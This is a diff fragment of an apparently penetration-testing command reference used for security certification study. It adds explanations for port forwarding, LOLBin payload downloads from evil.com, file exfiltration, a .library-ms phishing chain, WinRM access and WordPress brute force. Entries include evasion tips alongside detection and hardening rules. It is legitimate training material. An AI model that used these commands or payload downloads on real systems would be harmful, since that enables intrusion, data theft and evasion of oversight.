         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Uses the built-in Windows netsh portproxy on a pivot to forward a port to an internal target (no tools uploaded):\n  interface portproxy add v4tov4   IPv4-to-IPv4 forward\n  listenport / listenaddress       port and IP on the pivot to listen on\n  connectport / connectaddress     the internal target and port to reach\nConnect to the pivot's listenport to hit the internal service; needs an admin prompt and usually a matching firewall allow rule."
     },
     {
       "type": "command",
@@ -93099,7 +93372,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Downloads a file on Windows with PowerShell's WebClient:\n  New-Object Net.WebClient   create the client\n  .DownloadFile('<url>','C:\\Users\\Public\\out.ps1')   fetch <url> and write it to disk\nSaves the file locally; swap DownloadFile for DownloadString piped to IEX to run a script from memory with no disk write."
     },
     {
       "id": "findstr-hunt",
@@ -93335,7 +93609,8 @@ const COMMAND_DATA = {
           "command": "net use n: \\\\<attacker_ip>\\share /user:<user> <pass>\ncopy n:\\*.exe C:\\Tools\\",
           "label": "net"
         }
-      ]
+      ],
+      "explain": "Stands up an SMB server on your attack host to serve/receive files:\n  impacket-smbserver share   share name the target will map\n  -smb2support               enable SMB2/3 (needed by modern Windows)\n  /tmp/smbshare              the local folder backing the share\nThe target reaches it as \\\\<your-ip>\\share; add -user/-password when the target refuses unauthenticated guest SMB."
     },
     {
       "type": "command",
@@ -93471,7 +93746,8 @@ const COMMAND_DATA = {
           "command": "copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\<ip>\\DavWWWRoot\\",
           "label": "WebDAV copy"
         }
-      ]
+      ],
+      "explain": "Exfiltrates a file from Windows to your box using the PSUpload helper:\n  Invoke-FileUpload -Uri http://<ip>:8000/upload   POST to a Python uploadserver\n  -File C:\\Windows\\System32\\drivers\\etc\\hosts       the file to send\nUploads the file over HTTP; when uploadserver is unavailable, base64-encode the file and POST the blob to a netcat listener instead."
     },
     {
       "id": "win-bof-fuzzing",
@@ -94325,7 +94601,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Outbound SMB to internet not blocked. WebDAV client enabled. Email gateway doesn't block .library-ms files. No NTLM relay prevention (SMB signing not required).",
         "vulnerable_config": "# WebDAV client running (enables .library-ms connection):\nGet-Service WebClient | Select-Object Status  # Running\n\n# Outbound SMB not blocked:\n# Firewall: allow TCP 445 outbound to ANY = VULNERABLE\n# → library-ms → WebDAV auth → NTLM hash captured\n\n# Email gateway allows .library-ms:\n# No content filtering rule for Windows Library files",
         "secure_config": "# Disable WebDAV client (if not needed):\nStop-Service WebClient\nSet-Service WebClient -StartupType Disabled\n# Via GPO: Computer Config → Windows Settings → Security Settings → System Services\n# → WebClient: Disabled\n\n# Block outbound SMB at perimeter:\n# deny tcp internal_networks any eq 445\n# deny tcp internal_networks any eq 139\n\n# Email gateway: block .library-ms\n# Exchange transport rule:\nNew-TransportRule -Name 'Block Library Files' -AttachmentExtensionMatchesWords 'library-ms' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'Library files are blocked'\n\n# Require SMB signing (prevents relay even if hash captured):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force"
-      }
+      },
+      "explain": "A no-macro phishing chain using a .Library-ms file pointed at your WebDAV share:\n  <libraryDescription>...<url>http://<lhost></url>   the library file that mounts your share in Explorer\nWhen the user opens the .library-ms, Explorer transparently mounts the WebDAV share and shows it as a trusted folder; a malicious .lnk staged there (running a PowerShell download cradle) fires when clicked - host the share with wsgidav and catch the callback."
     },
     {
       "id": "win-local-enum-ps",
@@ -95118,7 +95395,8 @@ const COMMAND_DATA = {
           "command": "Test-NetConnection -ComputerName DATABASE01 -Port 5985\n$Session = New-PSSession -ComputerName DATABASE01\nCopy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\",
           "label": "Test + open session + copy file"
         }
-      ]
+      ],
+      "explain": "Copies a file across an existing PowerShell Remoting session:\n  Copy-Item -Path C:\\file.txt          the source file\n  -ToSession $Session                  send it over the open WinRM session\n  -Destination C:\\Users\\...\\Desktop\\    where to land it on the remote host\nTransfers over WinRM (5985) with no extra server; use -FromSession to pull a file back instead."
     },
     {
       "type": "command",
@@ -95227,7 +95505,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "WinRM with valid creds looks like normal management; avoid dropping tools - run built-ins over the session; clear PSReadline history on the remote host after."
-      }
+      },
+      "explain": "Gets a remote PowerShell session over WinRM with valid creds:\n  evil-winrm   the WinRM client\n  -i <ip>      the target (5985/5986)\n  -u/-p        username and password\nDrops you into an interactive PowerShell on the host; scan 5985/5986 first to confirm WinRM, and Impacket's wmiexec covers command execution over WMI (135) as an alternative."
     },
     {
       "id": "cdsa-m07-wireshark-advanced",
@@ -95324,7 +95603,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Full NTA analysis workflow - when to use each technique in investigation."
         }
-      ]
+      ],
+      "explain": "A Wireshark display filter isolating FTP control and data channels:\n  ftp        the FTP command/response channel (USER, PASS, RETR, ...)\n  ||         logical OR\n  ftp-data   the separate channel carrying the actual file bytes\nShows both halves of an FTP session so you can reconstruct transferred files; the card also covers Follow TCP Stream, HTTP object export, and RDP decryption with an imported RSA key."
     },
     {
       "platform": "linux",
@@ -95630,7 +95910,8 @@ const COMMAND_DATA = {
           "label": "Enumerate via wpscan",
           "command": "wpscan --url http://<url> --no-update"
         }
-      ]
+      ],
+      "explain": "Detects WordPress and enumerates themes/plugins from the page source:\n  curl -s http://<url>/   fetch the homepage\n  | grep -E 'WordPress|themes|plugins'   pull WordPress markers and asset links\nConfirms the CMS and reveals active themes/plugins passively; a plugin's /wp-content/plugins/<name>/readme.txt usually leaks its version for CVE matching."
     },
     {
       "type": "payload",
@@ -96167,7 +96448,8 @@ const COMMAND_DATA = {
           "label": "Brute a discovered user",
           "command": "wpscan --url http://<url> -U <user> -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc"
         }
-      ]
+      ],
+      "explain": "Scans a WordPress site for enumerable components with WPScan:\n  wpscan --url http://<url>   point at the target\n  --enumerate                 enumerate plugins, themes, and users (u,vp,vt to scope)\n  --api-token <token>         add known-vulnerability data from the WPScan database\nMaps the attack surface and flags vulnerable plugins/themes; it can also brute-force logins (-U/-P --password-attack xmlrpc)."
     },
     {
       "type": "command",
@@ -99186,7 +99468,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 950,
-  "buildDate": "2026-09-27T11:27:08.049Z",
+  "buildDate": "2026-09-27T11:47:35.166Z",
   "certifications": [
     "CDSA",
     "CPTS",
